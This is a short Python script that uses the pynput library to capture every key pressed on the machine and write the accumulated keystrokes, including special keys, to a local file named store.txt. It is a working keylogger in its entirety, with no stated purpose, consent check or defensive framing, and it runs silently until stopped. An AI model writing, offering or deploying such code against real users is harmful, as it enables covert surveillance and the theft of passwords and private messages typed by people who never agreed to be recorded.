import pynput.keyboard

log = ""

def process_key(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " +str(key) + " "
    f = open("store.txt","w+")
    f.write(log)
    f.close()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key)

with keyboard_listener:
    keyboard_listener.join()
